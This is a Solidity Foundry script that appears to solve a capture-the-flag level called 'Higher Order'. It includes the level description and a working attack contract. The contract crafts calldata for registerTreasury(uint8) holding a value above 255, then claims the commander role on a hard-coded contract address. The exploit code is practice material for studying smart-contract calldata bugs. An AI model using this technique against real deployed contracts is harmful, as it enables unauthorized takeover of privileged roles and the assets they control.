
// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;

import "../src/HigherOrder.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";


/*
    Imagine a world where the rules are meant to be broken, and only the cunning and the bold can rise to power.
    Welcome to the Higher Order, a group shrouded in mystery, where a treasure awaits and a commander rules supreme.

    Your objective is to become the Commander of the Higher Order! Good luck!

    Things that might help:
        Sometimes, calldata cannot be trusted.
        Compilers are constantly evolving into better spaceships.


    Solution
    Use low level .call() to send the registerTreasury function with a larger uint in the calldata

 */
contract HigherOrderAttack {
    constructor(HigherOrder _higherorder) public {
        // We need to send a uint8 of > 255 in the calldata of registerTreasury
        // This will store the number in the treasury slot
        // Then we can call claimLeadership
        bytes memory data = abi.encodeWithSignature(
            "registerTreasury(uint8)",
            bytes32(uint256(256))
        );
        (bool success, ) = address(_higherorder).call(data);
        require(success, "Call failed");
    }
}

contract HigherOrderSolution is Script {

    HigherOrder higherorderContract = HigherOrder(0x8d7d4364F3D47aD774B4F202C13de4Ea11eAe3D1);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new HigherOrderAttack(higherorderContract);
        higherorderContract.claimLeadership();
        vm.stopBroadcast();
        require(higherorderContract.commander() == vm.envAddress("MY_ADDRESS"));
    }
}